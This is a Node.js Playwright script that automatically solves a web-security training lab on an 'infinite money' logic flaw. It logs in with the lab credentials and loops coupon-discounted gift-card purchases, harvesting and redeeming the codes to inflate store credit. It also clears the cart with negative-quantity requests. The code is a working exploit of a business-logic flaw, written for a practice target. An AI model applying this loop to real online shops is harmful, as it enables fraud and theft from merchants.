const {
  addToCart,
  applyCoupon,
  getStoreCredit,
  labLogin,
  runLab,
} = require('./_common.cjs');

const TITLE = 'Infinite money logic flaw';
const PATH = '/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money';

function extractGiftCardCodes(text) {
  return [...new Set([...text.matchAll(/gift card code is:\s*([A-Za-z0-9]{10})/gi)].map((match) => match[1]))];
}

async function clearCart(page, labUrl) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.evaluate(async () => {
    for (let id = 1; id <= 20; id += 1) {
      // eslint-disable-next-line no-await-in-loop
      await fetch('/cart', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ productId: String(id), redir: 'CART', quantity: '-999999' }).toString(),
        credentials: 'include',
      });
    }
  });
}

async function checkoutWithResponse(page, labUrl) {
  await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
  await page.evaluate(() => document.querySelector('form[action*="/cart/checkout"]')?.submit());
  await page.waitForLoadState('domcontentloaded').catch(() => {});
  await page.waitForTimeout(1000);
  return { url: page.url(), html: await page.content() };
}

async function getEmailClientUrl(page, labUrl) {
  await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
  return page.locator('#exploit-link').getAttribute('href');
}

async function redeemGiftCardCodes(page, labUrl, codes) {
  if (!codes.length) return 0;
  await page.goto(labUrl + '/my-account', { waitUntil: 'domcontentloaded', timeout: 15000 });
  const csrf = await page.locator('#gift-card-form [name="csrf"]').inputValue().catch(() => '');
  const results = await page.evaluate(async ({ csrfToken, redeemCodes }) => {
    const outcomes = [];
    for (const code of redeemCodes) {
      // eslint-disable-next-line no-await-in-loop
      const response = await fetch('/gift-card', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ csrf: csrfToken, 'gift-card': code }).toString(),
        credentials: 'include',
      });
      // eslint-disable-next-line no-await-in-loop
      const text = await response.text();
      outcomes.push({ code, ok: !/Invalid gift card/i.test(text) });
    }
    return outcomes;
  }, { csrfToken: csrf, redeemCodes: codes });
  return results.filter((result) => result.ok).length;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page, labUrl }) => {
    await labLogin(page, labUrl, 'wiener', 'peter');
    await clearCart(page, labUrl);
    const emailClientUrl = await getEmailClientUrl(page, labUrl);
    const redeemed = new Set();

    const redeemAvailableCodes = async () => {
      const emailText = await page.request.get(emailClientUrl).then((response) => response.text());
      const codes = extractGiftCardCodes(emailText);
      const pending = codes.filter((code) => !redeemed.has(code));
      const redeemedNow = await redeemGiftCardCodes(page, labUrl, pending);
      pending.slice(0, redeemedNow).forEach((code) => redeemed.add(code));
      return redeemedNow;
    };

    await redeemAvailableCodes();

    let credit = await getStoreCredit(page, labUrl);
    while (credit < 1337) {
      const quantity = Math.max(1, Math.min(99, Math.floor(credit / 7)));
      await clearCart(page, labUrl);
      await addToCart(page, labUrl, 2, quantity);
      await page.goto(labUrl + '/cart', { waitUntil: 'domcontentloaded', timeout: 15000 });
      await applyCoupon(page, 'SIGNUP30');
      await checkoutWithResponse(page, labUrl);
      const redeemedNow = await redeemAvailableCodes();
      if (!redeemedNow) {
        throw new Error('No new gift card codes redeemed from email client');
      }
      credit = await getStoreCredit(page, labUrl);
      console.log(`credit: $${credit.toFixed(2)} via ${redeemedNow} newly redeemed codes`);
    }

    await clearCart(page, labUrl);
    await addToCart(page, labUrl, 1, 1);
    await checkoutWithResponse(page, labUrl);
  },
});
